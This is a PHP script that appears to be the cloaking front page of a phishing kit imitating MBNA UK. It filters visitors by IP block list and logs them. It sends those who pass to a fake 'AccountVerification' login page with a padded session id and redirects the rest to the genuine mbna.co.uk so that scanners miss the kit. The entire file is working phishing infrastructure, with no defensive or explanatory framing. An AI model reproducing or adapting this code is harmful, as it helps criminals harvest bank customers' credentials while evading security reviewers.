<?php
require_once("assets/includes/functions.php");

# Visitor IP range check

$ips = array(	$_SERVER['REMOTE_ADDR'],
				 );

$checklist = new IpBlockList( );
foreach ($ips as $ip ) {

	$result = $checklist->ipPass( $ip );

	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("assets/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("Login.php?sslchannel=true&form=AccountVerification&sessionid=" . generateRandomString(80));
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("assets/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiAlr2br6nhAhWEzYUKHYwHDzAQFjAAegQIBhAC&url=https://www.mbna.co.uk/&usg=AOvVaw2uqgqvXv_nWDditpWcEAjB");
		die();
	}
	
}

?>